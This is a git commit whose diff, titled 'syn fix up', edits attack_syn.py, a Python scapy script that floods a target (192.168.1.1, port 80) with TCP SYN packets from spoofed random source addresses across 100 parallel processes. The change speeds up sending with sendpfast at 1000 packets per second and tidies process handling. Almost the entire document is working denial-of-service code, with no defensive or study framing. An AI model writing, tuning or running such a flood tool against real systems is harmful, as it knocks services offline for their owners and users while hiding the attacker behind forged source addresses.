d9cea6db8077fd5c537c934bcd6c9ad8991d96a2
Nomads Developer <57294366+nomadsdev@users.noreply.github.com>
2024-09-05 03:37:53 +0700

    syn fix up

--- attack_syn.py
+++ attack_syn.py
@@ -1,12 +1,13 @@
-from scapy.all import IP, TCP, RandIP, RandShort, sendp
+from scapy.all import IP, TCP, RandIP, RandShort, sendpfast
 from multiprocessing import Process
 
 target_ip = "192.168.1.1"
 target_port = 80
 num_processes = 100
+packets_per_process = 1000
 
 def syn_flood(target_ip, target_port):
-    while True:
+    for _ in range(packets_per_process):
         src_ip = RandIP()
         src_port = RandShort()
         
@@ -14,8 +15,14 @@ def syn_flood(target_ip, target_port):
         tcp = TCP(sport=src_port, dport=target_port, flags="S")
         packet = ip/tcp
         
-        sendp(packet, verbose=False)
+        sendpfast(packet, pps=1000, verbose=False)
 
-for _ in range(num_processes):
-    p = Process(target=syn_flood, args=(target_ip, target_port))
-    p.start()
+if __name__ == "__main__":
+    processes = []
+    for _ in range(num_processes):
+        p = Process(target=syn_flood, args=(target_ip, target_port))
+        p.start()
+        processes.append(p)
+
+    for p in processes:
+        p.join()
